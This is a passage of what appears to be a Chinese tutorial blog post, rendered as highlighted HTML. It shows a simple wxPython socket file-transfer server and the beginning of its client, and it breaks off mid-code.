operator">=</span><span class="token string">'frame'</span><span class="token punctuation">,</span>style<span class="token operator">=</span><span class="token number">541072384</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>qdck <span class="token operator">=</span> wx<span class="token punctuation">.</span>Panel<span class="token punctuation">(</span>self<span class="token punctuation">)</span>        self<span class="token punctuation">.</span>Centre<span class="token punctuation">(</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>an1 <span class="token operator">=</span> wx<span class="token punctuation">.</span>Button<span class="token punctuation">(</span>self<span class="token punctuation">.</span>qdck<span class="token punctuation">,</span>size<span class="token operator">=</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">,</span> <span class="token number">46</span><span class="token punctuation">)</span><span class="token punctuation">,</span>pos<span class="token operator">=</span><span class="token punctuation">(</span><span class="token number">190</span><span class="token punctuation">,</span> <span class="token number">115</span><span class="token punctuation">)</span><span class="token punctuation">,</span>label<span class="token operator">=</span><span class="token string">'开始等待下载'</span><span class="token punctuation">,</span>name<span class="token operator">=</span><span class="token string">'button'</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>an1<span class="token punctuation">.</span>SetAuthNeeded<span class="token punctuation">(</span><span class="token boolean">True</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>an1<span class="token punctuation">.</span>Bind<span class="token punctuation">(</span>wx<span class="token punctuation">.</span>EVT_BUTTON<span class="token punctuation">,</span>self<span class="token punctuation">.</span>an1_anbdj<span class="token punctuation">)</span>        self<span class="token punctuation">.</span>bq1 <span class="token operator">=</span> wx<span class="token punctuation">.</span>StaticText<span class="token punctuation">(</span>self<span class="token punctuation">.</span>qdck<span class="token punctuation">,</span> size<span class="token operator">=</span><span class="token punctuation">(</span><span class="token number">150</span><span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">,</span> pos<span class="token operator">=</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">,</span> label<span class="token operator">=</span><span class="token string">'简单文件传输器'</span><span class="token punctuation">,</span> name<span class="token operator">=</span><span class="token string">'staticText'</span><span class="token punctuation">,</span>                                 style<span class="token operator">=</span><span class="token number">2321</span><span class="token punctuation">)</span>        bq1_字体 <span class="token operator">=</span> wx<span class="token punctuation">.</span>Font<span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">,</span> <span class="token number">74</span><span class="token punctuation">,</span> <span class="token number">90</span><span class="token punctuation">,</span> <span class="token number">700</span><span class="token punctuation">,</span> <span class="token boolean">False</span><span class="token punctuation">,</span> <span class="token string">'Microsoft YaHei UI'</span><span class="token punctuation">,</span> <span class="token number">28</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>bq1<span class="token punctuation">.</span>SetFont<span class="token punctuation">(</span>bq1_字体<span class="token punctuation">)</span>        self<span class="token punctuation">.</span>port<span class="token operator">=</span><span class="token number">8000</span>        <span class="token comment"># 设置默认端口号为8848 钛合金手机</span>        self<span class="token punctuation">.</span>cjljkL1 <span class="token operator">=</span> lib_hyperlink<span class="token punctuation">.</span>HyperLinkCtrl<span class="token punctuation">(</span>self<span class="token punctuation">.</span>qdck<span class="token punctuation">,</span>size<span class="token operator">=</span><span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">,</span> <span class="token number">28</span><span class="token punctuation">)</span><span class="token punctuation">,</span>pos<span class="token operator">=</span><span class="token punctuation">(</span><span class="token number">150</span><span class="token punctuation">,</span> <span class="token number">200</span><span class="token punctuation">)</span><span class="token punctuation">,</span>name<span class="token operator">=</span><span class="token string">'staticText'</span><span class="token punctuation">,</span>                                                   label<span class="token operator">=</span><span class="token string">'使用说明'</span><span class="token punctuation">,</span>URL<span class="token operator">=</span><span class="token string">'https://im-so-scared-2.gitee.io/shier_jinghuang/'</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>cjljkL1<span class="token punctuation">.</span>SetToolTip<span class="token punctuation">(</span>wx<span class="token punctuation">.</span>ToolTip<span class="token punctuation">(</span><span class="token string">'使用说明'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        cjljkL1_字体 <span class="token operator">=</span> wx<span class="token punctuation">.</span>Font<span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">70</span><span class="token punctuation">,</span><span class="token number">90</span><span class="token punctuation">,</span><span class="token number">400</span><span class="token punctuation">,</span><span class="token boolean">True</span><span class="token punctuation">,</span><span class="token string">'Microsoft YaHei UI'</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>cjljkL1<span class="token punctuation">.</span>SetFont<span class="token punctuation">(</span>cjljkL1_字体<span class="token punctuation">)</span>        self<span class="token punctuation">.</span>cjljkL1<span class="token punctuation">.</span>SetForegroundColour<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">255</span><span class="token punctuation">,</span> <span class="token number">255</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>an2 <span class="token operator">=</span> wx<span class="token punctuation">.</span>Button<span class="token punctuation">(</span>self<span class="token punctuation">.</span>qdck<span class="token punctuation">,</span> size<span class="token operator">=</span><span class="token punctuation">(</span><span class="token number">120</span><span class="token punctuation">,</span> <span class="token number">46</span><span class="token punctuation">)</span><span class="token punctuation">,</span> pos<span class="token operator">=</span><span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">,</span><span class="token number">115</span><span class="token punctuation">)</span><span class="token punctuation">,</span> label<span class="token operator">=</span><span class="token string">'选择共享文件夹'</span><span class="token punctuation">,</span> name<span class="token operator">=</span><span class="token string">'button'</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>an2<span class="token punctuation">.</span>Bind<span class="token punctuation">(</span>wx<span class="token punctuation">.</span>EVT_BUTTON<span class="token punctuation">,</span> self<span class="token punctuation">.</span>an2_anbdj<span class="token punctuation">)</span>        self<span class="token punctuation">.</span>an2<span class="token punctuation">.</span>SetAuthNeeded<span class="token punctuation">(</span><span class="token boolean">True</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>share_dir<span class="token operator">=</span><span class="token string">""</span>    <span class="token keyword">def</span> <span class="token function">an1_anbdj</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>event<span class="token punctuation">)</span><span class="token punctuation">:</span>        toastone <span class="token operator">=</span> wx<span class="token punctuation">.</span>MessageDialog<span class="token punctuation">(</span><span class="token boolean">None</span><span class="token punctuation">,</span> <span class="token string">"服务器的IP地址为："</span><span class="token operator">+</span>self<span class="token punctuation">.</span>ip<span class="token operator">+</span><span class="token string">"!"</span><span class="token punctuation">,</span> <span class="token string">"IP地址显示"</span><span class="token punctuation">,</span> wx<span class="token punctuation">.</span>YES_DEFAULT <span class="token operator">|</span> wx<span class="token punctuation">.</span>ICON_QUESTION<span class="token punctuation">)</span>        <span class="token keyword">if</span> toastone<span class="token punctuation">.</span>ShowModal<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> wx<span class="token punctuation">.</span>ID_YES<span class="token punctuation">:</span>            <span class="token comment"># 如果点击了提示框的确定按钮</span>            toastone<span class="token punctuation">.</span>Destroy<span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token comment"># 则关闭提示框</span>        phone <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span>        phone<span class="token punctuation">.</span>bind<span class="token punctuation">(</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>ip<span class="token punctuation">,</span> self<span class="token punctuation">.</span>port<span class="token punctuation">)</span><span class="token punctuation">)</span>        phone<span class="token punctuation">.</span>listen<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span>        <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>            conn<span class="token punctuation">,</span> client <span class="token operator">=</span> phone<span class="token punctuation">.</span>accept<span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>                    <span class="token comment"># 收命令</span>                    res <span class="token operator">=</span> conn<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">8096</span><span class="token punctuation">)</span>                    <span class="token comment"># 解析命令、提取相应的命令参数</span>                    cmds <span class="token operator">=</span> res<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'gbk'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment"># ['get','a.txt']  split变列表格式</span>                    filename <span class="token operator">=</span> cmds<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>                    <span class="token comment"># 已读的方式打开文件，读取文件内容发送给客户端</span>                    <span class="token comment"># 第一步：制作固定长度的报头</span>                    header_dic <span class="token operator">=</span> <span class="token punctuation">&#123;</span>                        <span class="token string">'filename'</span><span class="token punctuation">:</span> filename<span class="token punctuation">,</span>                        <span class="token string">'file_size'</span><span class="token punctuation">:</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>getsize<span class="token punctuation">(</span><span class="token string">r'%s/%s'</span> <span class="token operator">%</span> <span class="token punctuation">(</span>self<span class="token punctuation">.</span>share_dir<span class="token punctuation">,</span> filename<span class="token punctuation">)</span><span class="token punctuation">)</span>                        <span class="token comment"># 这里把文件的名字和地址结合在一起得到文件长度</span>                    <span class="token punctuation">&#125;</span>  <span class="token comment"># 字典方便储存数据</span>                    header_json <span class="token operator">=</span> json<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>header_dic<span class="token punctuation">)</span>  <span class="token comment"># 把字典转换成js格式(字符串类型)</span>                    header_bytes <span class="token operator">=</span> header_json<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'gbk'</span><span class="token punctuation">)</span>                    <span class="token comment"># 第二步：先发送报头的长度</span>                    conn<span class="token punctuation">.</span>send<span class="token punctuation">(</span>struct<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token string">'i'</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>header_bytes<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                    <span class="token comment"># 第三步：再发报头</span>                    conn<span class="token punctuation">.</span>send<span class="token punctuation">(</span>header_bytes<span class="token punctuation">)</span>                    <span class="token comment"># 第四步：发送真实数据</span>                    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'%s/%s'</span> <span class="token operator">%</span> <span class="token punctuation">(</span>self<span class="token punctuation">.</span>share_dir<span class="token punctuation">,</span> filename<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">'rb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>                        <span class="token keyword">for</span> line <span class="token keyword">in</span> f<span class="token punctuation">:</span>                            <span class="token comment"># 这样一行一行发比直接发送f.read节省内存空间</span>                            conn<span class="token punctuation">.</span>send<span class="token punctuation">(</span>line<span class="token punctuation">)</span>                    conn<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>                    <span class="token comment"># except ConnectionResetError as err:</span>                    <span class="token comment"># break</span>                    <span class="token keyword">break</span>        phone<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">bjk1_axEnterj</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>event<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token comment"># print('bjk1,按下Enter键')</span>        <span class="token comment"># print(self.share_dir)</span>        <span class="token keyword">pass</span>    <span class="token keyword">def</span> <span class="token function">an2_anbdj</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>event<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token comment"># print('an2,按钮被单击')</span>        dialog <span class="token operator">=</span> wx<span class="token punctuation">.</span>DirDialog<span class="token punctuation">(</span>self<span class="token punctuation">.</span>qdck<span class="token punctuation">,</span> message<span class="token operator">=</span><span class="token string">"打开文件夹"</span><span class="token punctuation">,</span> style<span class="token operator">=</span>wx<span class="token punctuation">.</span>DD_CHANGE_DIR<span class="token punctuation">)</span>        <span class="token keyword">if</span> dialog<span class="token punctuation">.</span>ShowModal<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> wx<span class="token punctuation">.</span>ID_OK<span class="token punctuation">:</span>            filename <span class="token operator">=</span> dialog<span class="token punctuation">.</span>GetPath<span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>filename<span class="token punctuation">)</span>            self<span class="token punctuation">.</span>share_dir<span class="token operator">=</span><span class="token builtin">str</span><span class="token punctuation">(</span>filename<span class="token punctuation">)</span>            img_list <span class="token operator">=</span> os<span class="token punctuation">.</span>listdir<span class="token punctuation">(</span>self<span class="token punctuation">.</span>share_dir<span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>img_list<span class="token punctuation">)</span>            <span class="token builtin">file</span> <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'文件菜单.txt'</span><span class="token punctuation">,</span> <span class="token string">'w'</span><span class="token punctuation">)</span>  <span class="token comment"># 创建文件，权限为写入</span>            <span class="token keyword">for</span> img_name <span class="token keyword">in</span> img_list<span class="token punctuation">:</span>                <span class="token builtin">file</span><span class="token punctuation">.</span>write<span class="token punctuation">(</span>img_name <span class="token operator">+</span> <span class="token string">'\n'</span><span class="token punctuation">)</span>            toastone <span class="token operator">=</span> wx<span class="token punctuation">.</span>MessageDialog<span class="token punctuation">(</span><span class="token boolean">None</span><span class="token punctuation">,</span> <span class="token string">"文件菜单已创建"</span><span class="token punctuation">,</span> <span class="token string">"软件提示"</span><span class="token punctuation">,</span> wx<span class="token punctuation">.</span>YES_DEFAULT <span class="token operator">|</span> wx<span class="token punctuation">.</span>ICON_QUESTION<span class="token punctuation">)</span>            <span class="token keyword">if</span> toastone<span class="token punctuation">.</span>ShowModal<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> wx<span class="token punctuation">.</span>ID_YES<span class="token punctuation">:</span>                <span class="token comment"># 如果点击了提示框的确定按钮</span>                toastone<span class="token punctuation">.</span>Destroy<span class="token punctuation">(</span><span class="token punctuation">)</span>                <span class="token comment"># 则关闭提示框</span>            dialog<span class="token punctuation">.</span>Destroy<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">class</span> <span class="token class-name">myApp</span><span class="token punctuation">(</span>wx<span class="token punctuation">.</span>App<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">OnInit</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>frame <span class="token operator">=</span> Frame<span class="token punctuation">(</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>frame<span class="token punctuation">.</span>Show<span class="token punctuation">(</span><span class="token boolean">True</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token boolean">True</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    app <span class="token operator">=</span> myApp<span class="token punctuation">(</span><span class="token punctuation">)</span>    app<span class="token punctuation">.</span>MainLoop<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="客户端："><a href="#客户端：" class="headerlink" title="客户端："></a>客户端：</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># -*- coding:utf-8 -*-</span><span class="token keyword">import</span> wx<span class="token punctuation">.</span>lib<span class="token punctuation">.</span>agw<span class="token punctuation">.</span>hyperlink <span class="token keyword">as</span> lib_hyperlink<span class="token keyword">import</span> wx<span class="token keyword">import</span> socket<span class="token keyword">import</span> struct  <span class="token comment"># 制作报头的模块</span><span class="token keyword">import</span> json   <span class="token comment"># 转换数据格式(序列化)</span><span class="token keyword">class</span> <span class="token class-name">Frame</span><span class="token punctuation">(</span>wx<span class="token punctuation">.</span>Frame<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        wx<span class="token punctuation">.</span>Frame<span class="token punctuation">.</span>__init__<span class="token punctuation">(</span>self<span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">,</span> title<span class="token operator">=</span><span class="token string">'简单文件传输器（客户端）'</span><span class="token punctuation">,</span> size<span class="token operator">=</span><span class="token punctuation">(</span><span class="token number">800</span><span class="token punctuation">,</span> <span class="token number">300</span><span class="token punctuation">)</span><span class="token punctuation">,</span>name<span class="token operator">=</span><span class="token string">'frame'</span><span class="token punctuation">,</span>style<span class="token operator">=</span><span class="token number">541072384</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>qdck <span class="token operator">=</span> wx<span class="token punctuation">.</span>Panel<span class="token punctuation">(</span>self<span class="token punctuation">)</span>        self<span class="token punctuation">.</span>Centre<span class="token punctuation">(</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>an1 <span class="token operator">=</span> wx<span class="token punctuation">.</span>Button<span class="token punctuation">(</span>self<span class="token punctuation">.</span>qdck<span class="token punctuation">,</span>size<span class="token operator">=</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">,</span> <span class="token number">46</span><span class="token punctuation">)</span><span class="token punctuation">,</span>pos<span class="token operator">=</span><span class="token punctuation">(</span><span class="token number">220</span><span class="token punctuation">,</span> <span class="token number">135</span><span class="token punctuation">)</span><span class="token punctuation">,</span>label<span class="token operator">=</span><span class="token string">'下载'</span><span class="token punctuation">,</span>name<span class="token operator">=</span><span class="token string">'button'</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>an1<span class="token punctuation">.</span>SetAuthNeeded<span class="token punctuation">(</span><span class="token boolean">True</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>an1<span class="token punctuation">.</span>Bind<span class="token punctuation">(</span>wx<span class="token punctuation">.</span>EVT_BUTTON<span class="token punctuation">,</span>self<span class="token punctuation">.</span>an1_anbdj<span class="token punctuation">)</span>        self<span class="token punctuation">.</span>bjk1 <span class="token operator">=</span> wx<span class="token punctuation">.</span>TextCtrl<span class="token punctuation">(</span>self<span class="token punctuation">.</span>qdck<span class="token punctuation">,</span>size<span class="token operator">=</span><span class="token punctuation">(</span><span class="token number">400</span><span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">,</span>pos<span class="token operator">=</span><span class="token punctuation">(</span><span class="token number">300</span><span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">,</span>value<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">,</span>name<span class="token operator">=</span><span class="token string">'text'</span><span class="token punctuation">,</span>style<span class="token operator">=</span><span class="token number">4096</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>bjk1<span class="token punctuation">.</span>SetMaxLength<span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>bq1 <span class="token operator">=</span> wx<span class="token punctuation">.</span>StaticText<span class="token punctuation">(</span>self<span class="token punctuation">.</span>qdck<span class="token punctuation">,</span>size<span class="token operator">=</span><span class="token punctuation">(</span><span class="token number">265</span><span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">,</span>pos<span class="token operator">=</span><span class="token punctuation">(</span><span class="token number">30</span><span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">,</span>label<span class="token operator">=</span><span class="token string">'请输入服务器IP地址:'</span><span class="token punctuation">,</span>name<span class="token operator">=</span><span class="token string">'staticText'</span><span class="token punctuation">,</span>style<span class="token operator">=</span><span class="token number">2321</span><span class="token punctuation">)</span>        bq1_字体 <span class="token operator">=</span> wx<span class="token punctuation">.</span>Font<span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">,</span><span class="token number">74</span><span class="token punctuation">,</span><span class="token number">90</span><span class="token punctuation">,</span><span class="token number">700</span><span class="token punctuation">,</span><span class="token boolean">False</span><span class="token punctuation">,</span><span class="token string">'Microsoft YaHei UI'</span><span class="token punctuation">,</span><span class="token number">28</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>bq1<span class="token punctuation">.</span>SetFont<span class="token punctuation">(</span>bq1_字体<span class="token punctuation">)</span>        self<span class="token punctuation">.</span>bq2 <span class="token operator">=</span> wx<span class="token punctuation">.</span>StaticText<span class="token punctuation">(</span>self<span class="token punctuation">.</span>qdck<span class="token punctuation">,</span> size<span class="token operator">=</span><span class="token punctuation">(</span><span class="token number">265</span><span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">,</span> pos<span class="token operator">=</span><span class="token punctuation">(</span><span class="token number">30</span><span class="token punctuation">,</span> <span class="token number">70</span><span class="token punctuation">)</span><span class="token punctuation">,</span> label<span class="token operator">=</span><span class="token string">'请输入需要下载的文件:'</span><span class="token punctuation">,</span> name<span class="token operator">=</span><span class="token string">'staticText'</span><span class="token punctuation">,</span>                                 style<span class="token operator">=</span><span class="token number">2321</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>bq2<span class="token punctuation">.</span>SetFont<span class="token punctuation">(</span>bq1_字体<span class="token punctuation">)</span>        self<span class="token punctuation">.</span>bjk2 <span class="token operator">=</span> wx<span class="token punctuation">.</span>TextCtrl<span class="token punctuation">(</span>self<span class="token punctuation">.</span>qdck<span class="token punctuation">,</span> size<span class="token operator">=</span><span class="token punctuation">(</span><span class="token number">400</span><span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">,</span> pos<span class="token operator">=</span><span class="token punctuation">(</span><span class="token number">300</span><span class="token punctuation">,</span> <span class="token number">70</span><span class="token punctuation">)</span><span class="token punctuation">,</span> value<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">,</span> name<span class="token operator">=</span><span class="token string">'text'</span><span class="token punctuation">,</span> style<span class="token operator">=</span><span class="token number">4096</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>bjk2<span class="token punctuation">.</span>SetMaxLength<span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>cjljkL1 <span class="token operator">=</span> lib_hyperlink<span class="token punctuation">.</span>HyperLinkCtrl<span class="token punctuation">(</span>self<span class="token punctuation">.</span>qdck<span class="token punctuation">,</span>size<span class="token operator">=</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">,</span> <span class="token number">28</span><span class="token punctuation">)</span><span class="token punctuation">,</span>pos<span class="token operator">=</span><span class="token punctuation">(</span><span class="token number">380</span><span class="token punctuation">,</span> <span class="token number">200</span><span class="token punctuation">)</span><span class="token punctuation">,</span>name<span class="token operator">=</span><span class="token string">'staticText'</span><span class="token punctuation">,</span>                                                   label<span class="token operator">=</span><span class="token string">'使用说明'</span><span class="token punctuation">,</span>URL<span class="token operator">=</span><span class="token string">'https://im-so-scared-2.gitee.io/shier_jinghuang/'</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>cjljkL1<span class="token punctuation">.</span>SetToolTip<span class="token punctuation">(</span>wx<span class="token punctuation">.</span>ToolTip<span class="token punctuation">(</span><span class="token string">'使用说明'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        cjljkL1_字体 <span class="token operator">=</span> wx<span class="token punctuation">.</span>Font<span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">70</span><span class="token punctuation">,</span><span class="token number">90</span><span class="token punctuation">,</span><span class="token number">400</span><span class="token punctuation">,</span><span class="token boolean">True</span><span class="token punctuation">,</span><span class="token string">'Microsoft YaHei UI'</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>cjljkL1<span class="token punctuation">.</span>SetFont<span class="token punctuation">(</span>cjljkL1_字体<span class="token punctuation">)</span>        self<span class="token punctuation">.</span>cjljkL1<span class="token punctuation">.</span>SetForegroundColour<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">255</span><span class="token punctuation">,</span> <span class="token number">255</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>an2 <span class="token operator">=</span> wx<span class="token punctuation">.</span>Button<span class="token punctuation">(</span>self<span class="token punctuation">.</span>qdck<span class="token punctuation">,</span> size<span class="token operator">=</span><span class="token punctuation">(</span><span class="token number">120</span><span class="token punctuation">,</span> <span class="token number">46</span><span class="token punctuation">)</span><span class="token punctuation">,</span> pos<span class="token operator">=</span><span class="token punctuation">(</span><span class="token number">450</span><span class="token punctuation">,</span> <span class="token number">135</span><span class="token punctuation">)</span><span class="token punctuation">,</span> label<span class="token operator">=</span><span class="token string">'选择文件存放地址'</span><span class="token punctuation">,</span> name<span class="token operator">=</span><span class="token string">'button'</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>an2<span class="token punctuation">.</span>Bind<span class="token punctuation">(</span>wx<span class="token punctuation">.</span>EVT_BUTTON<span class="token punctuation">,</span> self<span class="token punctuation">.</span>an2_anbdj<span class="token punctuation">)</span>        self<span class="token punctuation">.</span>an2<span class="token punctuation">.</span>SetAuthNeeded<span class="token punctuation">(</span><span class="token boolean">True</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>share_dir <span class="token operator">=</span> <span class="token string">""</span>    <span class="token keyword">def</span> <span class="token function">an2_anbdj</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>event<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token comment"># print('an2,按钮被单击')</span>        dialog <span class="token operator">=</span> wx<span class="token punctuation">.</span>DirDialog<span class="token punctuation">(</span>self<span class="token punctuation">.</span>qdck<span class="token punctuation">,</span> message<span class="token operator">=</span><span class="token string">"请选择文件存放地址"</span><span class="token punctuation">,</span> style<span class="token operator">=</span>wx<span class="token punctuation">.</span>DD_CHANGE_DIR<span class="token punctuation">)</span>        <span class="token keyword">if</span> dialog<span class="token punctuation">.</span>ShowModal<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> wx<span class="token punctuation">.</span>ID_OK<span class="token punctuation">:</span>            filename <span class="token operator">=</span> dialog<span class="token punctuation">.</span>GetPath<span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>filename<span class="token punctuation">)</span>            self<span class="token punctuation">.</span>share_dir <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>filename<span class="token punctuation">)</span>            dialog<span class="token punctuation">.</span>Destroy<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">an1_anbdj</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>event<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>ip<span class="token operator">=</span>self<span class="token punctuation">.</span>bjk1<span class="token punctuation">.</span>GetValue<span class="token punctuation">(</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>filename<span class="token operator">=</span>self<span class="token punctuation">.</span>bjk2<span class="token punctuation">.</span>GetValue<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>filename<span class="token punctuation">)</span>        phone <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>ip<span class="token punctuation">)</span>        cmd <span class="token operator">=</span> <span class="token string">"get "</span> <span class="token operator">+</span> self<span class="token punctuation">.</span>filename        <span class="token keyword">print</span><span class="token punctuation">(</span>cmd<span class="token punctuation">)</span>        phone<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>ip<span class="token punctuation">,</span> <span class="token number">8000</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"------开始咨询客服---------"</span><span 